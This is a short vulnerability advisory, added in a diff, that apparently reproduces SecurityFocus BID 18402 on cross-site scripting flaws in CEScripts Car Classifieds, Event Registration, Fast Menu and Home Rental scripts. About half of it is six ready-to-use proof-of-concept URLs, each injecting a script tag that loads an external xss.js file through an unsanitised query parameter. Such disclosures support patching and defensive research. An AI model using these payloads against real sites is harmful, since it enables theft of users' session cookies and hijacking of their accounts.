@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/18402/info
+
+CEScripts scripts are prone to multiple cross-site scripting vulnerabilities because they fail to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+These issues affect CEScripts Car Classifieds, Event Registration(all versions), Fast Menu Restaurant Ordering v1.0, and Home Rental Script (all versions); other scripts may also be vulnerable.
+
+http://www.example.com/car_classifieds/listings/index.php?pag=car_view&car_id=32&offset=0&ord=1&make_id=63&#039;>">&#039;><SCRIPT%20SRC=http://www.example.com/xss.js></SCRIPT>
+http://www.example.com/car_classifieds/listings/index.php?pag=car_list&ord=1&make_id=63&#039;>">&#039;><SCRIPT%20SRC=http://www.example.com/xss.js></SCRIPT>
+http://www.example.com/rsvp3/view-event-details.php?event_id=74&#039;>">&#039;><SCRIPT%20SRC=http://www.example.com/xss.js></SCRIPT>
+http://www.example.com/rsvp3/event-registration.php?select_events=74&#039;>">&#039;><SCRIPT%20SRC=http://www.example.com/xss.js></SCRIPT>&submit=Register
+http://www.example.com/fastmenu/index.php?pag=gift_certificate&sel_menu=5&#039;>">&#039;><SCRIPT%20SRC=http://www.example.com/xss.js></SCRIPT>
+http://www.example.com/home_rental/index.php?pag=list_properties&act=basket-add&id=17&type=room&ofs=0&day=11&month=6&year=2006&night=1&hotel_id=&show=&sel_menu=&#039;>">&#039;><SCRIPT%20SRC=http://www.example.com/xss.js></SCRIPT>
